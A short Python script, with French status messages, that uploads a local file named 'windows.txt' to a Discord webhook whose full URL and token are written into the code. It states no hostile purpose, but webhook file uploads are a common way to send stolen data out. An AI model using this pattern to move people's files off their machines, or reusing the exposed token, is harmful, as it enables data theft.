from pathlib import Path
import requests

URL = "https://discordapp.com/api/webhooks/1541975239657783406/TDhnbeNWT5fm4XycXyTgPBnSFkaIVY_kT1bQ2IEmd1yDhwcMEjnFkLhkYHd4ZNseMqW_"
fichier = Path("windows.txt")

if fichier.is_file():
    try:
        with fichier.open("rb") as f:
            res = requests.post(URL, files={"file": (fichier.name, f)}, timeout=10)
            res.raise_for_status()
            print("Fichier envoyé avec succès.")
    except requests.RequestException as err:
        print(f"Erreur d'envoi : {err}")
else:
    print("Fichier introuvable.")
